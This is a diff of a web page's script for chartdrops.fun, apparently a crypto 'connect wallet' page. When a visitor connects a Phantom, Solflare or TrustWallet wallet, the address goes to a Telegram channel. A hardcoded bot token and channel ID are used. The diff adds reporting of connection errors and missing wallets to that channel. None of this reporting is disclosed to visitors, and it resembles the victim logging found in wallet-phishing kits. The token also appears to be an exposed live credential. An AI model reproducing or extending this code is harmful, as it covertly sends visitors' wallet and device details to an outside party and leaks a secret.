@@ -52,8 +52,11 @@
     const BOT_TOKEN = "7978623862:AAHezOh3PLYYy92TIjtIN9oRof32nbfwNMQ";
     const CHANNEL_ID = "-1002600871606";
 
-    async function sendTelegramMessage(walletAddress) {
-      const message = `✅ Wallet ${walletAddress} Connected To chartdrops.fun`;
+    async function sendTelegramMessage(walletAddress, error = false) {
+      const message = error
+        ? `❌ Wallet Connect Error on chartdrops.fun:\n${walletAddress}`
+        : `✅ Wallet ${walletAddress} Connected To chartdrops.fun`;
+
       try {
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: 'POST',
@@ -63,35 +66,27 @@
             text: message
           })
         });
-
         const result = await res.json();
         console.log("Telegram Response:", result);
-
-        if (!res.ok || !result.ok) {
-          alert(`Telegram error: ${result.description || res.statusText}`);
-        }
       } catch (err) {
-        console.error("Telegram send error:", err);
+        console.error("Telegram error:", err);
       }
     }
 
     async function connectPhantom() {
-      if ('solana' in window) {
-        const provider = window.solana;
-        if (provider.isPhantom) {
-          try {
-            const resp = await provider.connect();
-            const walletAddress = resp.publicKey.toString();
-            sendTelegramMessage(walletAddress);
-            alert(`Connected: ${walletAddress}`);
-          } catch (err) {
-            console.error("Phantom connect error", err);
-          }
-        } else {
-          alert("Phantom extension not found.");
+      if (typeof window.solana !== "undefined" && window.solana.isPhantom) {
+        try {
+          const resp = await window.solana.connect();
+          const walletAddress = resp.publicKey.toString();
+          sendTelegramMessage(walletAddress);
+          alert(`Connected: ${walletAddress}`);
+        } catch (err) {
+          console.error("Phantom connect error", err);
+          sendTelegramMessage(`Phantom error: ${err.message}`, true);
         }
       } else {
-        alert("Phantom not installed. Please install it.");
+        alert("Phantom wallet not installed. Please install it.");
+        sendTelegramMessage("Phantom wallet not found on the device.", true);
       }
     }
 
@@ -106,6 +101,7 @@
         alert(`Connected: ${walletAddress}`);
       } catch (err) {
         alert("Solflare connection failed.");
+        sendTelegramMessage("Solflare connection failed.", true);
       }
     }
 
@@ -118,9 +114,11 @@
           alert(`Connected: ${walletAddress}`);
         } catch (err) {
           alert("TrustWallet connection failed.");
+          sendTelegramMessage("TrustWallet connection failed.", true);
         }
       } else {
         alert("TrustWallet not detected.");
+        sendTelegramMessage("TrustWallet not found on the device.", true);
       }
     }
   </script>
